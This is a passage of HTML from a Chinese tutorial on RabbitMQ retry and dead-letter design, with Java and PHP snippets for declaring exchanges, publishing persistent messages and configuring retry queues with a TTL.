title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 声明Exchange：主体，失败，重试\r\nchannel.exchangeDeclare(\"master\", \"topic\", true);\r\nchannel.exchangeDeclare(\"master.retry\", \"topic\", true);\r\nchannel.exchangeDeclare(\"master.failed\", \"topic\", true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6e6731656695-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6e6731656695-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6e6731656695-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6e6731656695-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6e6731656695-1\"><span class=\"crayon-c\">// 声明Exchange：主体，失败，重试</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6e6731656695-2\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exchangeDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"topic\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6e6731656695-3\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exchangeDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"topic\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6e6731656695-4\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exchangeDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"topic\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca6f0954525545\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 普通交换机\r\n$this-&gt;channel-&gt;exchange_declare('master', 'topic', false, true, false);\r\n// 重试交换机\r\n$this-&gt;channel-&gt;exchange_declare('master.retry', 'topic', false, true, false);\r\n// 失败交换机\r\n$this-&gt;channel-&gt;exchange_declare('master.failed', 'topic', false, true, false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f0954525545-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6f0954525545-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f0954525545-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6f0954525545-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f0954525545-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6f0954525545-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f0954525545-1\"><span class=\"crayon-c\">// 普通交换机</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6f0954525545-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">exchange_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'topic'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f0954525545-3\"><span class=\"crayon-c\">// 重试交换机</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6f0954525545-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">exchange_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'master.retry'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'topic'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f0954525545-5\"><span class=\"crayon-c\">// 失败交换机</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6f0954525545-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">exchange_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'master.failed'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'topic'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>在RabbitMQ的管理界面中，我们可以看到创建的三个Exchange</p>\n<p><img title=\"-w539\" src=\"https://segmentfault.com/img/remote/1460000014847794\" alt=\"-w539\"></p>\n<h3>消息发布</h3>\n<p>消息发布时，使用<code>basic_publish</code>方法，参数如下</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>message</td>\n<td>–</td>\n<td>发布的消息对象</td>\n</tr>\n<tr>\n<td>exchange</td>\n<td><strong>master</strong></td>\n<td>消息发布到的Exchange</td>\n</tr>\n<tr>\n<td>routing-key</td>\n<td>–</td>\n<td>路由KEY，用于标识消息类型</td>\n</tr>\n<tr>\n<td>mandatory</td>\n<td>false</td>\n<td>是否强制路由，指定了该选项后，如果没有订阅该消息，则会返回路由不可达错误</td>\n</tr>\n<tr>\n<td>immediate</td>\n<td>false</td>\n<td>指定了当消息无法直接路由给消费者时如何处理</td>\n</tr>\n</tbody>\n</table>\n<p>发布消息时，对于<code>message</code>对象，其内容建议使用<strong>json编码后的字符串</strong>，同时消息需要标识以下属性</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca6f5430266683\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n'delivery_mode'=&gt; 2 // 1为非持久化，2为持久化</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f5430266683-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f5430266683-1\"><span class=\"crayon-s\">'delivery_mode'</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 1为非持久化，2为持久化</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca6f8427567655\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchannel.basicPublish(\r\n    \"master\", \r\n    routingKey, \r\n    MessageProperties.PERSISTENT_BASIC, // delivery_mode\r\n    message.getBytes()\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f8427567655-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6f8427567655-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f8427567655-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6f8427567655-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6f8427567655-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6f8427567655-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f8427567655-1\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6f8427567655-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"master\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f8427567655-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6f8427567655-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">MessageProperties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PERSISTENT_BASIC</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// delivery_mode</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6f8427567655-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6f8427567655-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca6fb725858615\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$msg = new AMQPMessage($message-&gt;serialize(), [\r\n    'delivery_mode' =&gt; AMQPMessage::DELIVERY_MODE_PERSISTENT,\r\n]);\r\n\r\n$this-&gt;channel-&gt;basic_publish($msg, 'master', $routingKey);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6fb725858615-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6fb725858615-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6fb725858615-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca6fb725858615-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca6fb725858615-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6fb725858615-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AMQPMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">message</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">serialize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6fb725858615-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'delivery_mode'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AMQPMessage</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">DELIVERY_MODE_PERSISTENT</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6fb725858615-3\"><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca6fb725858615-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca6fb725858615-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0180 seconds] -->\r\n<p></p>\n<h3>消息订阅</h3>\n<p>消息订阅的实现相对复杂一些，需要完成队列的声明以及队列和Exchange的绑定。</p>\n<h4>Declare Queue</h4>\n<p>对于每一个订阅消息的服务，都必须创建一个该服务对应的队列，将该队列绑定到关注的路由规则，这样之后，消息生产者将消息投递给Exchange之后，就会按照路由规则将消息分发到对应的队列供消费者消费了。</p>\n<p>消费服务需要declare三个队列</p>\n<ul>\n<li><code>[queue_name]</code> 队列名称，格式符合 <code>[服务名称]@订阅服务标识</code></li>\n<li><code>[queue_name]@retry</code> 重试队列</li>\n<li><code>[queue_name]@failed</code> 失败队列</li>\n</ul>\n<blockquote><p><code>订阅服务标识</code>是客户端自己对订阅的分类标识符，比如用户中心服务（服务名称ucenter），包含两个订阅：user和enterprise，这里两个订阅的队列名称就为 <code>ucenter@user</code>和<code>ucenter@enterprise</code>，其对应的重试队列为 <code>ucenter@user@retry</code>和<code>ucenter@enterprise@retry</code>。</p></blockquote>\n<p>Declare队列时，参数规定规则如下</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>queue</td>\n<td>–</td>\n<td>队列名称</td>\n</tr>\n<tr>\n<td>passive</td>\n<td>false</td>\n<td>队列不存在则创建，存在则直接成功</td>\n</tr>\n<tr>\n<td>durable</td>\n<td>true</td>\n<td>队列持久化</td>\n</tr>\n<tr>\n<td>exclusive</td>\n<td>false</td>\n<td>排他，指定该选项为true则队列只对当前连接有效，连接断开后自动删除</td>\n</tr>\n<tr>\n<td>no-wait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n<tr>\n<td>auto-delete</td>\n<td>false</td>\n<td>当不再使用时，是否自动删除</td>\n</tr>\n</tbody>\n</table>\n<p>对于<code>@retry</code>重试队列，需要指定额外参数</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca700488721201\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n'x-dead-letter-exchange' =&gt; 'master'\r\n'x-message-ttl'          =&gt; 30 * 1000 // 重试时间设置为30s</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca700488721201-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca700488721201-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca700488721201-1\"><span class=\"crayon-s\">'x-dead-letter-exchange'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca700488721201-2\"><span class=\"crayon-s\">'x-message-ttl'</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 重试时间设置为30s</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] 